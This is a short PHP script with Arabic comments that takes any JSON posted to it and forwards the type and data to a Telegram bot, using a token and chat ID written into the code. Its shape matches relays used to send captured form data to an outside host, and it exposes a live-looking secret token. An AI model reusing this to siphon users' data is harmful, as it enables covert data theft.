<?php
// إعدادات التليجرام - هنا تكون محمية تماماً ولا يراها أحد
$botToken = "8597407463:AAEZ98PLouzh7ivB8WqRGGuGhiPYCbUMS5Q";
$chatId = "1705240737";

$input = json_decode(file_get_contents("php://input"), true);
if ($input) {
    $msg = "🚨 [تنبيه جديد]\n";
    $msg .= "النوع: " . $input['type'] . "\n";
    $msg .= "البيانات: " . json_encode($input['data'], JSON_UNESCAPED_UNICODE);

    // الإرسال من السيرفر مباشرة لتليجرام
    file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($msg));
}
?>
